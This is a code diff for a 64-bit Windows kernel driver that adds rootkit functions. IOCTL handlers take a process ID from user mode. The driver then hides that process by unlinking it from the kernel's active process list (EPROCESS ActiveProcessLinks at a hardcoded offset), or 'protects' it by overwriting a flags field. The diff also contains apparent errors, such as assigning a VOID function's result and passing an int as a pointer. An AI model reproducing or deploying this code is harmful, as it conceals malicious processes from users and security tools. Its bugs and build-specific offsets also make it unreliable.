@@ -11,6 +11,19 @@
 #define IOCTL_IO_PROTECT		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_IO_HIDE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+// Define undocumented kernal api
+NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
+NTKERNELAPI CHAR* PsGetProcessImageFileName(PEPROCESS Process);
+
+// Define offset of special element in EPROCESS structure 
+#define PROCESS_ACTIVE_PROCESS_LINKS_OFFSET	0x188
+#define PROCESS_FLAG_OFFSET					0x440
+
+PEPROCESS GetProcessObjectByPID(DWORD *PID);
+VOID RemoveListEntry(PLIST_ENTRY ListEntry);
+ULONG ProtectProcess(PEPROCESS Process, BOOLEAN bIsProtect, ULONG v);
+VOID HideProcess(PEPROCESS Process);
+
 //Unload
 VOID DriverUnload(PDRIVER_OBJECT pDriverObj)
 {	
@@ -51,8 +64,10 @@ NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
 	PVOID pIoBuffer;
 	ULONG uInSize;
 	ULONG uOutSize;
-	int	PROCPID = 0;
+	ULONG op_dat;
 
+	int	PROCPID = 0;
+	PEPROCESS ProcEP = NULL;
 
 	DbgPrint("ProcModule64 DispatchIoctl\n");
 	//Get IRP data
@@ -71,14 +86,27 @@ NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
 		{	
 			// Get process pid from ring0
 			PROCPID = *((DWORD *)pIoBuffer);
-			DbgPrint("The Input PID is :%d\r\n",find_PID);			
-
+			DbgPrint("The Input PID is :%d\r\n",PROCPID);			
+			ProcEP=GetProcessObjectByPID(PROCPID);
+			if(ProcEP)
+			{
+				op_dat=ProtectProcess(ProcEP,1,0);
+				ObDereferenceObject(ProcEP);
+			}
 			status = STATUS_SUCCESS;
 			break;
 		}
 		case IOCTL_IO_HIDE:
 		{
-			DbgPrint("Hide\n");
+			// Get process pid from ring0
+			PROCPID = *((DWORD *)pIoBuffer);
+			DbgPrint("The Input PID is :%d\r\n",PROCPID);			
+			ProcEP=GetProcessObjectByPID(PROCPID);
+			if(ProcEP)
+			{
+				op_dat=HideProcess(ProcEP);
+				ObDereferenceObject(ProcEP);
+			}
 			status = STATUS_SUCCESS;
 			break;
 		}
@@ -123,4 +151,60 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryString)
 	}
 	DbgPrint("ProcModule64 DriverEntry\n");
 	return STATUS_SUCCESS;
+}
+
+// Get EPROCESS Structure
+PEPROCESS GetProcessObjectByPID(DWORD *PID)
+{
+	NTSTATUS st;
+	PEPROCESS ep;
+	st=PsLookupProcessByProcessId((HANDLE)PID,&ep);
+	if(NT_SUCCESS(st))
+	{
+		char *pn=PsGetProcessImageFileName(ep);
+		return ep;
+	} else {
+		return NULL;
+	}
+}
+
+// Break the two-way linked list of EPROCESS stuct
+VOID RemoveListEntry(PLIST_ENTRY ListEntry)
+{
+	KIRQL OldIrql;
+	OldIrql = KeRaiseIrqlToDpcLevel();
+	if (ListEntry->Flink != ListEntry &&
+		ListEntry->Blink != ListEntry &&
+		ListEntry->Blink->Flink == ListEntry &&
+		ListEntry->Flink->Blink == ListEntry) 
+	{
+			ListEntry->Flink->Blink = ListEntry->Blink;
+			ListEntry->Blink->Flink = ListEntry->Flink;
+			ListEntry->Flink = ListEntry;
+			ListEntry->Blink = ListEntry;
+	}
+	KeLowerIrql(OldIrql);
+}
+
+// Protect Process
+ULONG ProtectProcess(PEPROCESS Process, BOOLEAN bIsProtect, ULONG v)
+{
+	ULONG op;
+	if(bIsProtect)
+	{
+		op=*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET);
+		*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET)=0;
+		return op;
+	}
+	else
+	{
+		*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET)=v;
+		return 0;
+	}
+}
+
+// Hide Process
+VOID HideProcess(PEPROCESS Process)
+{
+	RemoveListEntry((PLIST_ENTRY)((ULONG64)Process+PROCESS_ACTIVE_PROCESS_LINKS_OFFSET));
 }
